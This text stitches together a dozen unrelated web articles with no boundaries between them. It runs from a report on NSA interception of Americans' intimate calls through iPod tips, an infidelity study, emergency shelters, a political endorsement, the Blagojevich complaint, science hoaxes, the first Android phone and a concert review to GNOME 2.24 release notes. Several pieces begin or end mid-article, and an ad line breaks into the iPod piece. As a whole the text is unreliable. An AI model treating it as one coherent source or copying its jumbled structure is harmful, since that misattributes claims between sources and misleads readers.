The inspector general for the National Security Agency , the NSA , has begun an investigation into allegations that US intelligence operators intercepted , recorded and shared intimate phone calls and " phone sex " between hundreds of American citizens , the Director of National Intelligence , J.M. McConnell , has told US Senators .
In a letter released today , McConnell said the NSA was unaware of the allegations , made by two former intercept operators , until ABC News reported them .
Former Army Arab linguist Adrienne Kinne and former Navy Arab linguist David Murfee Faulk told ABC
News they observed and participated in intercepting private calls between Americans while they were detailed to a NSA listening post at Fort Gordon , outside Augusta , Georgia .
Kinne said calls by American journalists , aid workers and soldiers serving in Iraq were targeted for interception , because , she says she was told , there were " special waivers " to make it legal .
" There is no indication of Mr. Faulk having reported his allegations to relevant officers prior to recent press reporting , " McConnell wrote to Senators Patrick Leahy ( D - VT ) and Arlen Specter ( R - PA ) , the chairman and raking minority party member of the Senate Judiciary Committee .
Faulk told ABC
News that he did not voice his complaints directly to commanding officers because others told him they had already complained to no avail .
" I regret that decision , " Faulk said .
McConnell also told the Senators he looked into " one of the allegations " made by former Army linguist Kinne and did not find a violation of laws or procedures .
In its initial reaction , an NSA spokesman had suggested , apparently wrongly , that all of Kinne 's allegations had been unfounded .
Now , according to McConnell , the inspector general is reviewing its initial findings on Kinne .
Senators Leahy and Specter also demanded to know what steps had been taken by NSA to " detect , deter and punish " violations .
McConnell said " if personnel have disregarded these rules , we will hold them accountable . "
Both former intercept operators said intimate calls , including " phone sex " of soldiers calling home , were often passed around at the NSA facility so others could listen in .
In addition to the Senate Judiciary Committee , the chairman of the Senate Intelligence Committee , Jay Rockefeller ( D - WV ) , has also announced his committee will investigate the ABC News allegations .

Make it a flash card player
Whether you 're prepping for a presentation or cramming for a test , your iPod can be a much more convenient way to carry your memory - boosting flash cards around than trying to cram a whole deck of 3x5s in your pocket .
Mac OSX
Hints has a through guide to transforming Keynote slides into iPod-ready picture slides , but any slide presentation maker that can export slides to picture files can create a folder that you simply sync up to your iPod .
Your mileage will vary with your screen size and clarity , but for straight - up words , it 's a handy hack .
Steve Rubel 's Micro Persuasion blog details a similar spin on using your iPod as a presentation tool .

9 . Instant stereo , just add speakers
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
No matter how old your iPod , it 's still a pretty efficient music holder and player .
If you 're hesitant to shell out big cash for a full - fledged stereo system , your trusty iPod is a great hub for your music .
CNET details why you should give your iPod speakers , noting the benefits of simultaneously ditching your actual - plastic CDs — or at least putting them deep into storage — and simplifying your music life through the power of " Shuffle . "
It 's not a solution for audiophiles , but it is the start of a no - hassle , instant - on system for any room in the house .
8 . Your portable drinks / recipe / Wikipedia reference

Next time your dinner party or casual chat session turns into a debate about what happened to the star of A Christmas Story or how to properly make a sidecar , pull out your spare iPod and put the details to rest .
The fully - fledged Encyclopodia project can put the majority of Wikipedia 's useful articles on your iPod without messing up its main functions .
iPod Bartender puts just what you think it might into your player , and those who do n't like printing or lugging a laptop into their kitchen just for recipe reference should take a look at PodGourmet .

7 . Make it your backup drive

Simple , but supremely useful , enabling and using an iPod 's " Disk Mode " — basically opening up for use as a USB drive — pays off in a number of ways .
After speeding up your iPod drive with disk defragging , you can boot your Mac from it , use it with most any Windows backup program that lets you choose a save location , automatically back up your Mac home folder with iPodBackup , and generally stash away anything you want on one of the most space - optimized drives around .

6 . Free it from i Tunes ' grasp

If you live in a world of Windows systems and you 're sick of being tied down to iTunes and its memory - hogging tendencies , you do n't have to live with it .
Back in 2006 , Adam showed us how to make a self - sustaining iPod using the free vPod software .
vPod 's author notes that the tool for directly adding your music does n't work with the newer firmwares available for most iPods since iTunes upgraded beyond 7.3 , but for an older unit that 's been gathering dust , that 's probably not an issue .
For a newer spin on no-iTunes - required , take a look at Adam 's newer iPod independence guide , or check out SharePod , Songbird , MediaMonkey a try .
And then there 's Floola , in a class by itself because it can run directly from your iPod and transfer songs on and off it .

5 . Make a stand - alone , bootable XP computer from it

Sure , you can carry around the portable versions of your favorite Windows apps on your iPod 's drive , but you can ensure absolutely nothing gets changed on your friends ' and relatives '
PCs by booting your own Windows system from your iPod.
Gina detailed the process using an XP installation CD and the MojoPac software .
The no-restrictions version is n't free ( $ 29.99 for a license ) , but there 's a free version that gives you a virtual XP desktop — and that might be just what you need .

4. Load it up with games

Apple 's iTunes store offers up games for both older video iPods and the newer iPod touch models , but if you 're just looking for a little airport time - killing , why pay for your games , or feel forced into an upgrade ?
Install iPod Linux on nearly any iPod , and you 'll be able to play games on your iPod for free .

Men are better at detecting infidelity than women but tend to suspect their female partners even when they are faithful , a study has found .
Scientists interviewed 203 heterosexual couples about their infidelities in confidential questionnaires and found that although men were more likely to have cheated on their wives or girlfriends , with 29 per cent admitting to at least one affair compared to 18.5 per cent of the women , they were also more likely to detect infidelity .
Women made correct inferences about their partner 's infidelity about 80 per cent of the time but men scored significantly better – they were right about 94 per cent of the time , according to Paul Andrews of Virginia Commonwealth University in Richmond .

" We wanted to know if men or women were more accurate in detecting sexual infidelity , " Dr Andrews said .
" We found that , if everyone was being truthful in their answers , it was the men who were more accurate .
But we also found that men tended to suspect infidelity when there was n't any .
" We also developed a statistical method for estimating the amount of under - reporting of infidelity .
We found that men tended to be honest about their affairs whereas women tended to under - report infidelities by about 10 per cent .
" Women are probably more reticent in disclosing information .
They appear to be so much better at concealing their infidelity whereas men are better at detecting infidelity , based on this evidence , " Dr Andrews added .
The research , published in the journal Human Nature , lends support to the idea that men are honed by evolution to be wary of infidelity in their female partners because they can never be sure whether the children they are supporting are their own or whether they have been cuckolded .
The findings from the study need to be supported by further research but they suggest there is an evolutionary " arms race " between the sexes , with men trying to get better at detecting sexual infidelity in women and women becoming more skilled at concealing it , said Dr Andrews .
" We found evidence suggesting men may be more motivated to seek out information that resolves suspicions about the sexual fidelity of their partners , and this may contribute to their greater accuracy . "
David Buss of the University of Texas , Austin , said : " This [ study ] adds to the evidence that men have evolved defences to detect infidelity .
[ It demonstrates ] a fascinating cognitive bias that leads men to err on the side of caution by overstating a partner 's infidelity . "
A political or environmental crisis can be devastating to populations and families – forcing people from their homes and property .
To lessen the human damage and provide a measure of safety and comfort for victims , temporary shelters are an invaluable asset .
These designs , however , go above and beyond the standard stock emergency shelters in providing more efficient , affordable and all around more interesting living quarters .
SHRIMP ( Sustainable Housing for Refugees via Mass Production ) refugee housing units are compact , durable structures that can fold up to fit into 1/4 of a standard shipping container .
When you do the math , that means that a single ship can carry housing for over 100,000 people .
Each unit houses up to four people , is built of sustainable materials , and can be assembled on - site with only basic tools .
And since the units can be set up on solid ground or float on six inflatable pontoons , they are extremely versatile for different types of situations .
With more than 35 million refugees worldwide , it ’s become clear that housing solutions for displaced people need to be made a priority .
Concrete Canvas shelters go a step beyond tents and other short - term shelters with a lifespan of approximately 10 years .
They require nothing more than water and air to construct and can be built by crews with absolutely no training .
Within hours of a crisis , the shelters can be set up and ready to live in .
When Nader Khalili came up with “ superadobe ” structures in 1984 , he intended them to be used in human colonies on the moon .
Their practical application ended up being more Earthly in the end , though .
Today , his groundbreaking design means that sandbags and barbed wire – two common materials of war – can be used to house those made homeless by war or other disasters .
Usually , time and resources are extremely limited after a disaster .
Housing the affected population is a difficult prospect when there is no money and few supplies to construct temporary shelters .
When Azin Valy and Suzan Wines of I - Beam Design considered this problem , the solution became evident : use shipping pallets .
They are inexpensive , abundant , and sturdy , making them the ideal material to use for housing displaced populations .
They can be left as - is for mild climates or finished off into a more permanent structure with the addition of solid wall coverings .
In the aftermath of a disaster such as a tsunami or earthquake , few things are more comforting than a warm , dry place to sleep .
The Sanctuary shelter provides that comfort in a new and very appealing way .
The biodegradable shelter pops open on its own with no need for tools or tent poles .
Inside can be found a dry towel , biodegradable sandals , a first aid kit , and a warm blanket .
The water - repellent material is insulated to keep residents safe , and the top of the shelter even features a reflective “ X ” to help rescue helicopters find those who need assistance .
For $ 35,000 you may expect a more permanent housing solution , but this recyclable cardboard house is an impressive temporary shelter .
It goes up in less than 6 hours and comes with a composting toilet and water collection system .
The pre-fab cardboard house started out as a concept but grew into an actual product .
Sadly , it looks like the website to buy the cardboard houses is no longer operational , but you might be able to get the same effect for the same price with about 35,000 cardboard moving boxes .
Following a disaster , displaced people may find themselves crowded together in inadequate or makeshift shelters .
Studio D‘s concept for temporary shelters would give each person their own living space and a place to keep their own possessions .
The shelters use common materials and are simple to erect , making them an ideal choice for housing and protecting those made homeless due to any type of disaster .
Finding and constructing housing for displaced people requires a dependable way to get the building materials to the site .
These temporary emergency shelters come packed two to a shipping container and can be delivered via truck or cargo ship .
The ingenious design includes a center piece that pops up via hydraulic pump , creating separate living and sleeping spaces .
Photovoltaic cells and a rainwater collection system make these shelters the ideal way to deliver functional housing to any disaster site .
When climbing a mountain or hiking in a remote region , it ’s not unusual to see emergency shelters dotting the landscape .
These shelters have helped plenty of people escape harm in case of avalanches or stay safe while awaiting rescue for some other type of emergency .
The type of shelter depends on the landscape and the particular dangers of that area .
The “ apple ” shelter on the left can be found in Castle Rock , Colorado .
Golden Ears Emergency Station , on the right , is located in Golden Ears Provincial Park , British Columbia .
When the Lisbon Ideas Challenge asked for innovative Photovoltaic ( PV ) applications , the Basic Housing Unit for Urban Natural Hazards was one of the most intriguing entries .
The temporary housing unit incorporates a PV film and inflatable structure , making it an ideal way to house displaced urban victims of natural disasters .
The “ Sphere ” design from Felix Stark provides for not only the basic physical needs of disaster victims , but the social needs of displaces people as well .
The center of these tents can be used as a meeting place for residents , while individual units can be used to maintain privacy and personal space .
Inspired by the stackable plastic beds used in overcrowded prisons , University of Michigan professor Allen Samuels devised a clever way to house refugees .
His temporary huts are made of biodegradable , easy - to - clean , lightweight plastic .
The wheels on one end make it easy to move around , and there is even a bit of room to store personal belongings .
Time is of the essence when disaster strikes .
Hours are precious , and if affected people can be housed right away the impact of a disaster can be greatly minimized .
The reCover shelter is designed to be a first - response shelter for those forced from their homes due to disasters or evacuations .
It can be used for up to a month and can house a family of four .
The structure folds flat for storage and transportation , making it easy to transport a large number of them to where they ’re needed .
When you ’re stuck out in the elements or simply get separated from a group , staying in place and waiting for help may be the best idea .
The Cocoon Emergency Shelter from designer John Moriarty is intended to keep you warm and safe until help arrives .
You simply hang it from a tree or any other off - the - ground location , then climb inside and let the insulated materials keep you warm .
For about $ 100 , refugees can be sheltered in Hexayurts : sturdy and space - economical structures meant to temporarily house those in need .
In less than two hours , a cardboard Hexayurt can be built and ready to move into .
If you have a bit more time and money , Hexayurts can be built from nearly any building material available .
Why so , since my views align a lot more with McCain ’s than with Obama’s ?
And since I truly dread the notion of a Democratic president , Democratic House , and hugely Democratic Senate ?
Primarily for two reasons , those of temperament and of judgment .
When the economic crisis broke , I found John McCain bouncing all over the place .
In those first few crisis days , he was impetuous , inconsistent , and imprudent ; ending up just plain weird .
Having worked with Ronald Reagan for seven years , and been with him in his critical three summits with Gorbachev , I ’ve concluded that that ’s no way a president can act under pressure .
Second is judgment .
The most important decision John McCain made in his long campaign was deciding on a running mate .
That decision showed appalling lack of judgment .
Not only is Sarah Palin not close to being acceptable in high office — I would not have hired her for even a mid-level post in the arms - control agency .
But that selection contradicted McCain ’s main two , and best two , themes for his campaign — Country First , and experience counts .
Neither can he credibly claim , post - Palin pick .
I sure hope Obama is more open , centrist , sensible — dare I say , Clintonesque — than his liberal record indicates , than his cooperation with Nancy Pelosi and Harry Reid portends .
If not , I will be even more startled by my vote than I am now .
We admit it :
We 've been unconvinced by some of the comic book versions of Doctor Who in the past ( although current series The Forgotten is surprisingly enjoyable ) .
But if comics artist Ben " 30 Days of Night " Templesmith 's warm - up sketches for an upcoming comic that he 'll be illustrating are anything to go by , that may change .
And if you think his Doctor is good , wait until you see his Martha .

“ He does n’t show any signs of resigning or any willingness to do that , ” said Ms. Madigan , who has long been viewed as a rival to Mr. Blagojevich .
“ It will take time for an impeachment proceeding , and it may end up that the most efficient way to proceed is to have the Supreme Court declare him unfit .
We are certainly considering that . ”

Much of the political world in Chicago and Springfield was buzzing Wednesday with guesses , based on hints in the court papers , about the identities of the various other people in the complaint , including those under consideration by the governor for Mr. Obama ’s seat .
At his news conference , Mr. Jackson acknowledged that he was the politician referred to as Senate Candidate 5 in the complaint ; Valerie Jarrett , who is to be one of Mr. Obama ’s White House aides , had previously been identified as Senate Candidate 1 .
According to the complaint , in the weeks of recorded phone calls at his home and campaign office , Mr. Blagojevich considered various ways that he might financially gain from the possible Senate appointments .
He talked about how one potential choice might help him secure a post with the Obama administration as a cabinet secretary , and he also talked about possible deals that might win him a union leadership post or a high - paying job with a nonprofit organization .
The complaint also said the governor was trying to obtain contributions from a lengthy list of people and companies , a list that the complaint said was turned over to the Federal Bureau of Investigation .
The document also provided a compendium of instances in which Mr. Wyma , the Blagojevich associate cooperating with the authorities , said Mr. Blagojevich had exhorted Mr. Wyma and others to quickly bring in hundreds of thousands of dollars in cash .
The complaint said Mr. Blagojevich told Mr. Wyma in early October that he wanted the chief executive of Children ’s Memorial Hospital in Chicago to raise $ 50,000 after it had been awarded $ 8 million in state money .
At one point , Mr. Blagojevich threatened to withdraw the state money because the hospital executive had failed to make an earlier contribution the governor had expected , the complaint said .

The history of science is replete with frauds and fakers – here are eleven of the most creative .
You want fusion , President Perón ?
Ronald Richter worked as a scientist in Nazi Germany before arriving Argentina after the second world war .
President Juan Perón was desperate to forge a bold , empowered Argentina , so when Richter claimed he could produce endless energy from nuclear fusion , Perón lapped it up .
Richter was given colossal amounts of money and free rein to build his fusion facility , on a beautiful lake island .
A few years – and secret experiments – later Richter announced that he had reached his goal .
Perón quickly made a grandstanding announcement to the media of the world …
A staggering achievement , if only it had been true .
The rest , as they say , is hoax history .
CRAP paper accepted by journal
At New Scientist we love a good hoax , especially one that both amuses and makes a serious point about the communication of science .
So kudos to Philip Davis , a graduate student at Cornell University in Ithaca , New York , who got a nonsensical computer - generated paper accepted for publication in a peer - reviewed journal .

Fatal flaw fingers fake fossil fly
A fossil fly that was been one of London ’s Natural History Museum ’s greatest entomological treasures for 70 years , is a Victorian fake .
In a piece of detection worthy of Sherlock Holmes , Andrew Ross , a student of ancient insects , uncovered an entomological crime on a par with the Piltdown hoax ( see below ) – but perpetrated at least 60 years earlier .
Get gold from the sea
The discovery of gold in seawater in 1872 , created a kind of gold rush – or gold slosh , perhaps .
“ The ocean is a goldmine , ” the newspapers crowed .
Even with an estimated gold content of less than 1 grain per tonne of water that meant a lot of precious metal just there for the taking .
Prescott Jernegan ’s Electrolytic Marine Salts Company promised gold from the sea , and the town of Lubec , Maine , boomed as company ’s gold - accumulating machines got to work , apparently very successfully .
You can probably imagine what happened next .
Piltdown Man
In 1912 , solicitor and amateur palaeontologist Charles Dawson “ found ” the Piltdown fossils , a skull and jawbone that appeared to be half - man half - ape , in Sussex .
They were hailed as the evolutionary “ missing link ” between apes and humans .
It was over 40 years later , in 1953 , that the fossil was exposed as a fake .
In fact , the skull was constructed from a medieval human cranium attached to the jaw of an orang - utan .
The Cardiff Giant
A ten -foot “ petrified man ” was dug up on a small farm in Cardiff , New York , in October 1869 .
The “ Cardiff Giant ” became a huge news story and many Americans travelled to see it .
Early in 1870 , it was revealed as a fake , the creation of New Yorker George Hull , who had paid for it to be carved out of stone .
Beringer ’s fraudulent fossils
Physician Johann Beringer was amazed when he was presented with fossils “ found ” in Wurzburg , Germany , in 1725 , which depicted incredible scenes : the forms of birds , bees , snails , lizards , plants with flowers , frogs mating and insects feeding , not to mention comets , moons and suns .
It turned out that he was the victim of an elaborate plot : envious colleagues of Beringer had planted the fossils .
Unfortunately , Beringer fell for it hook , line and sinker , and even published a book to tell the world about the fossils .
Rumour has it that once Beringer realised the hoax , he tried to buy up any unsold copies of his book .
( See Johann Beringer and the fraudulent fossils )
There are many more examples of fossil fraud , such as the fake “ entombed toad ” and the fake fossil fly in amber .
The Sokal hoax
In 1996 , American physicist Alan Sokal submitted a paper loaded with nonsensical jargon to the journal Social Text , in which he argued that quantum gravity is a social and linguistic construct .
( Read Sokal ’s paper )
When the journal published it , Sokal revealed that the paper was in fact a spoof .
The incident triggered a storm of debate about the ethics of Sokal ’s prank .
The spaghetti tree
In 1957 , the BBC show Panorama broadcast a programme about the spaghetti tree in Switzerland .
It showed a family harvesting pasta that hung from the branches of the tree .
After watching the programme , hundreds of people phoned in asking how they could grow their own tree .
Alas , it was an April Fools ’
Day joke .

The Upas tree
An account was published in the London Magazine in 1783 by a Dutch surgeon named Foersch ( his initials were variously given as NP and JN ) .
It claimed the existence of a tree on the island of Java so poisonous that it killed everything within a 15 - mile radius .
Read the original account ( scroll down to find it )
This was the start of a legend .
Even Erasmus Darwin wrote about it in a poem in 1791 .
A note to the poem read , “ There is a poison - tree in the island of Java , which is said by its effluvia to have depopulated the country … in a district of 12 or 14 miles round it , the face of the earth is quite barren and rocky , intermixed only with the skeletons of men and animals ; affording a scene of melancholy beyond what poets have described or painters delineated . ”
You really can find the Upas tree in Indonesia .
Though not as potent as legend would have it , the latex of the tree does contain a powerful toxin , which was traditionally used on arrow points .

The secret of immortality
Johann Heinrich Cohausen , an 18th - century physician , wrote a treatise on the prolongation of life , entitled Hermippus redivivus .
Amongst other secrets of longevity , it claimed that life could be prolonged by taking an elixir produced by collecting the breath of young women in bottles .
Actually , Cohausen admitted in the last few pages of the work that it was a satire , so any gullible readers would n’t have been duped for too long .
Tomorrow is widely anticipated to be the day when T - Mobile announces availability of the first Android phone .
The phone is reportedly an HTC “ Dream , ” which will apparently sell for $ 199 with a two year contract .
Many believe the handset will resemble a Sidekick .
It ’s fitting in a way that a Sidekick - like device should be the first Android phone .
Android co-founder Andy Rubin was the one - time CEO of Danger , which made the Sidekick for T - Mobile .
On the eve of the announcement , it ’s also fitting that Rubin , now director of mobile platforms at Google , broadly weighs in on the future of mobile .
It ’s now almost a cliche to call mobile phones the most personal piece of technology .
And it ’s equally simplistic to point out that there are many times the number of mobile handsets around the globe as PCs — more than three billion .
Yet these facts are what have motivated Google — offensively and defensively — to invest so heavily in mobile ; it represents a font of future search queries that may eventually exceed those from the traditional internet .
But that ’s the 30,000 foot view .
Once we come down to Earth the issues become more varied and complex .
Mobile Internet adoption is growing dramatically in the US and around the world .
According to Nielsen Mobile , the US is now the country with the greatest mobile internet usage :
Source : Nielsen Mobile
There are higher penetration figures in the market as well .
Indeed , the US mobile internet audience is roughly 25 percent the size of the desktop internet today .
However the mobile internet is a more elusive and complex beast .
The fact that most people in the US have conventional “ feature phones ” and do n’t have data plans represent barriers to adoption .
Despite this , the mobile internet adoption is growing fast and so is search on mobile devices .
( Advertising will generally lag consumer adoption in mobile , however , as it did online . )
More than any other single event the launch of the iPhone last year catalyzed the mobile market , which had been in state of sleepy evolution for years .
But the Apple device kicked everyone in the rear and kicked the market into high gear .
We can effectively date the mobile internet like this : “ BI ” and “ AI ” ( before iPhone , after iPhone ) .
Every handset OEM , from BlackBerry to LG and Nokia , has been motivated to respond with improved devices and user experiences .
The iPhone and corresponding mobile internet adoption have also helped open US carriers ’ eyes to the potential data revenues from mobile internet access .
( According to CTIA mobile data revenues are now 20 percent of total US wireless carrier revenues . )

The iPhone is like the “ proof of concept device ” for the mobile internet .
And it is the device to which the first Android phone will inevitably be compared by everyone .
Google has seen its mobile fortunes rise with the iPhone .
But the iPhone has tiny market share and is limited to AT&T subscribers , although there are 70 + million of them in the US .
Android is , in some respects , the anti-iPhone .
Like the iPhone it seeks to provide a better user experience but also features a totally open platform unlike the highly controlled Apple device .
At a conference last week , I had a mobile company executive tell me , “ Steve Jobs re-wrote our press release . ”
That can be seen as a metaphor for the tight controls that Apple imposes on developers and the entire process of launching iPhone applications .
The Android software ecosystem promises to be more freewheeling and more uneven as a result .
But Google hopes that Android phones will make a strong , positive impression .
Google ’s Rubin has publicly fretted that Android wo n’t get a second chance to make a first impression , as the old shampoo commercial argues .
An Apple executive I had lunch with recently wondered if Google ’s method of releasing betas and then “ iterating over them ” would work with Android .
Rubin ’s public comments suggest that Google is n’t taking that approach with Android .
The stakes are too high .
If the first Android phones are a hit and favorably received , you can expect that other OEMs and carriers will quickly fall in line .
Right now there ’s likely a wait - and - see attitude .
The objective of Android — as with Google ’s participation in the US government spectrum auction earlier this year — is to move the entire mobile industry forward by opening it up .
If Google succeeds , on the shoulders of the iPhone ’s early success , it will benefit consumers and , ultimately , Google .
As stated above , mobile query volumes are almost certain to outstrip the conventional internet .
The only question is how long will that take .
Nielsen says that US mobile search users average nine queries per month on Google .
In research recently conducted by the program I run at Local Mobile Search , we found mobile search frequency numbers that were much higher :
Source : Opus Research / Multiplied Media ( 8/08 , n=789 [ this question , n=128 ] )
While Google is n’t calling the first Android phone a “ GPhone ” or “ Google Phone , ” T - Mobile is expected to push the association with Google to help drive sales .
Google has a stronger brand than phone maker HTC or T - Mobile itself .
So we may get a “ Google Phone ” after all .
The irony here is that Google does n’t require bundling of its services or the promotion of its brand in connection with Android .
An OEM or carrier can make an Android phone entirely without Google ’s products or brand anywhere in evidence .
Google is confident that its brand strength and consumer affinity will translate into mobile success — even without Android .
It already has .
comScore /M: Metrics data show Google with a mobile search lead akin to its desktop market share around the world :
Source : comScore ( 6/08 )
While search wo n’t necessarily play the identical role in mobile it does online , it will still be a prominent part of the mobile internet experience .
You can bet Google is banking on that .
I left the Smashing Pumpkins concert feeling confused and abused .
Sorry folks , the Smashing Pumpkins have not been revived .
They are simply Billy and the New Pumpkins ; not to be confused with the band we fell in love with in the 90s .
Pumpkins Show at the Chicago Theater
I have been pumped for a couple of weeks to watch Billy thrash on his guitar , and thrash he did , but it was not what I has hoping for , not even close .
Nestled high up in balcony 4 of the Chicago theater , my curious stare was mounted on Billy as he went off in a haze of clouded riffs and indiscernible lyrics .
Billy and the New Pumpkins concert in Chicago last night was a bad trip that got worse as the show went on .
Utter amazement drenched my spirit as I watched someone who used to be a kick - ass guitarist turn into a whinny punk that was not performing for the crowd , but for something entirely different ( I have yet to figure it out ) .
It was the final moments of the concert that encapsulated where Billy and his new band stand with their new focus .
Billy actually scolded the audience .
His tirade , stemming from static sales and poor reviews , stretched for far too long .
He spit his angst at fans for their disinterest in him , his new band , and his new sound ( Which he based on demographic reports , seriously , he mentioned demographic report .
Chicago does not love you because we do n't by records ?
We have not even heard from the Pumpkins in years . ) .
Fans wanted the old Pumkpins ; straight - shooting heavy shit that made our heads bob .
Billy and the New Pumpkins no longer Smash .
Instead , they provide floating riffs , poor lyrics , and ego - driven diatribe .
And , finally ended the night , not with a heavy - hitting jam session , but with Kazoos .
That 's right folks , Kazoos .
Billy lost me at " hello " .
My beloved Pumpkins no longer Smashing like they used and I am moving on .
I will not be going to another Billy and the New Pumpkins concert .
Without the Smashing , there is no Pumpkins .
A final note to Billy :
By simply adding a female Bassist and an Asian Guitarist , you do not re-create Darcy and James ; failed attempt .
And , Billy , check the thread on the Tribune site ... GO NOW

The author uses an engaging approach to discuss the changes that took place as early primates from the Cretaceous period evolved bit by bit towards modern humans and beyond !
Baxter selects 19 individuals and follows each through a portion of their lives .
The first is a tiny , rat - like primate living along - side dinosaurs 65 million years ago , and the last is a distant relative of humans living 500 million years in the future .
As we get to know each individual we get a sense of what motivates them , how they live , and how they have built upon that which their ancestors used to be successful .
I had two big take - aways from this book .
The first was how much human behavior is reminiscent of our evolutionary ancestors , and the second is how short a time ( in the grander scheme of things ) that humans have been around .
Behavior from Our Past :
Baxter builds the human psyche piece by piece as each character becomes more intelligent , more resourceful , and more human - like by inheriting and modifying the traits of its ancestors .
Seeing this construction play out over the course of the book gives an interesting perspective on which behaviors are new , which are old , and how each one gave a selection advantage to the ancestors who developed it .
One of the most interesting examples was Baxter ’s hypothesis that pre-humans that could believe in religions ( i.e. seemingly un-related causal relationships ) had a huge advantage over those who did n’t .
Believers would fight more fiercely and endure greater hardships because they were doing so for mysterious , unseen rewards and punishments .
People who could n’t make this leap of faith would give up far more quickly , and hence were eventually out - competed by modern humans who could .
I ’d say that ’s a pretty plausible explanation for people ’s superstitious behavior !
We ’re Just A Blip :
The other major point I got from reading this book is that humans as we understand ourselves are really just a blip in the evolutionary time - frame .
We ’ve been able to significantly out - pace biological evolution with our technological evolution .
What is really startling about this is how quickly that technological progress could be set back .
If the expertise that is embedded in our culture were lost , all of the grandeur of humans today would fall quickly back to the struggle to hunt and gather that was our plight ten - thousand years ago !
We ’re really hanging on a fragile , precarious thread .
Wrapping Up
Overall it was a great read .
I found the book intriguing and educational in the beginning as Baxter leads up to modern humans , and as he lets his imagination soar in the “ after humans ” period of the book , it was an interesting exercise in sci - fi futurism .

You can learn more about the changes that happened in GNOME 2.22 from its release notes .
Join us today and see what a difference you can make .
The GNOME Desktop is released every six months and contains many new features , improvements , bug fixes and translations .
GNOME 2.24 continues this tradition .
To learn more about GNOME and the qualities that distinguish it from other computer desktop environments ( such as usability , accessibility , internationalisation and freedom ) visit the About GNOME page on our website .
GNOME 2.24 is the latest version of the GNOME Desktop : a popular , multi-platform desktop environment for your computer .
GNOME 's focus is ease of use , stability , and first class internationalisation and accessibility support .
GNOME is Free and Open Source Software and provides all of the common tools computer users expect of a modern computing environment , such as e-mail , groupware , web browsing , file management , multimedia and games .
Furthermore , GNOME provides a flexible and powerful platform for software developers , both on the desktop and in mobile applications .
2. What 's New For Users
The GNOME Project 's focus on users and usability continues in GNOME 2.24 with its hundreds of bug fixes and user - requested improvements .
The sheer number of enhancements makes it impossible to list every change and improvement made , but these notes aim to highlight some of the more exciting , user - oriented features in this release .
2.1 . Stay in Touch GNOME 2.24 announces the inclusion of an instant messaging client based off the Telepathy communications framework .
Figure 2 Empathy Instant Messenger Empathy also supports XMPP / SIP audio and video conferencing as available on the Nokia N800 / N810 devices ( video requires H.263 codecs for GStreamer to be installed ) .
Empathy is a great companion to Ekiga , GNOME 's audio / video SIP client ( see Section 2.3 ― Ekiga 3.0 ) .
Telepathy provides a common framework for applications to access instant messaging functionality .
It can utilise many common protocols including Jabber / XMPP , Google Talk , MSN Messenger and Apple 's Bonjour / Rendezvous local network chat .
Any application is able to utilise the instant messaging session .
As well as the Empathy client , GNOME 2.24 provides libraries enabling developers to add presence and status information , transfer files or set up sockets ( known as Tubes ) for collaboration and games over the Internet .
See Section 4.4 ― Instant Messaging Libraries for more information on how this technology can be utilised in your application .
2.2 . Track Your Time Better
For many people in business , it is crucial that they track how much time they assign to each project and client .
Everybody has their own system for this , from keeping a diary to making a guess .
It 's incredibly tedious .
In today 's world almost everything you do somehow involves a computer , so GNOME has added a panel application to make tracking your time easier .
Figure 3 Set Your Task Quickly
The panel shows you what task you 've been working on and for how long .
Clicking on the button allows you to change activity and see what activities you 've been working on today .
If you like , the timer can stop when your computer goes idle .
Activities can be categorised by any grouping you choose : be it the type of activity , client 's name or how much you dislike it .
You can also view and edit your activity log , insert missing activities and see daily , weekly and monthly graphs to see where you 're spending most of your time .
2.3 . Ekiga 3.0 Ekiga is a fully - featured SIP audio / video conferencing client for GNOME .
As part of GNOME 2.24 we 're proud to announce the release of Ekiga 3.0 .
Figure 4 Ekiga 3.0
As well as a new interface that is centred around your phone book and the presence of your contacts , Ekiga 3.0 features SIP presence support , PBX line monitoring , better video codecs support ( H.264 , H.263 + , MPEG - 4 and Theora ) , accelerated video and optional fullscreen and many SIP - related improvements for robust conferencing .
2.4 . File Management
As well as icon and list views , GNOME 2.24 now offers the compact list view , popular in several other desktop environments .
Choose the view by selecting View ▸ Compact from the menu ( or keyboard shortcut Control + 3 ) .
Figure 5
The three file views : icon , list and compact
As with icon and list view , the size of the icons in the compact view can be changed using the zoom options in the View menu .
The browser mode of the file manager now supports tabs for rapidly switching between directories within a single browser window .
Figure 6 Tabbed Browser Support Today 's modern filesystems are able to handle almost any desired character as part of the filename .
Unfortunately this is not the case for the FAT filesystem that is commonly used on many USB thumb drives and portable music players , which is unable to use many common punctuation marks as part of the filename .
GNOME 2.24 detects when you are copying files with names that contains characters that cannot be used and automatically converts these characters to a " _ " without you having to rename the file yourself .
Automatic filename completion ( " tab " completion ) has also been improved in GNOME 2.24 .
Completion of filenames in the location bar using the Tab key is now faster and more predictable .
It is also possible to complete any fragment of the path and the interface provides more feedback for when there are no other possible matches available .
2.5 . Do More With Deskbar
The Deskbar in GNOME 2.24 adds several exciting new plugins : a calculator , Google Search ( and code search ) , Yahoo ! and Wikipedia suggestions plus updating of Twitter and identi.ca .
Figure 7 Deskbar
Also new is the ability to easily download and install new plugins directly from the Deskbar repository on the World Wide Web .
2.6 . New Screen Resolution Controls
More and more computers ( especially laptops ) are gaining support for multiple monitors ( known as multihead ) .
Users need to be able to connect a second monitor , either as a clone ( e.g. a projector for giving presentations ) or as an extension of their desktop .
GNOME 2.24 has upgraded its screen resolution controls to make this possible .
Utilising the new XRandR 1.2 specification from X. Org , this dialogue enables users to easily set up individual monitors in a number of configurations .
Monitors are named and the names appear in the top left corner of the screen for easy identification .
Figure 8 New Screen Resolution Controls Changes are applied immediately .
No restart of GNOME is required .
XRandR 1.2 Driver Compatibility Some X. Org video drivers do not currently support XRandR 1.2 and so will not be able to take advantage of these features .
One such driver is the proprietary nVidia X driver .
2.7 . New Sound Theme Support Sound themes in GNOME are now handled by libcanberra , which implements the Freedesktop.org Sound Theme and Naming Specification .
Sound themes can now be installed like icon themes .
Using libcanberra also means that an application 's alert sounds are less likely to interfere with your music player or movie player , so you can leave those important alert sounds switched on while watching a fullscreen movie .
Figure 9 Sound Theme Support
2.8 . Better Digital TV Powered by the GStreamer multimedia framework , GNOME 2.22 introduced digital television ( DVB ) capabilities into its Movie Player .
Determined to make things even better , developers have worked to enhance this support by adding support for multiple DVB tuners ( watch multiple channels at once ) and better troubleshooting diagnostics .
They have also worked to improve out - of - the - box ( zero configuration ) support for the majority of infrared remote controls ( using the LIRC framework ) .
This makes it even easier to chill out instead of writing that important report .
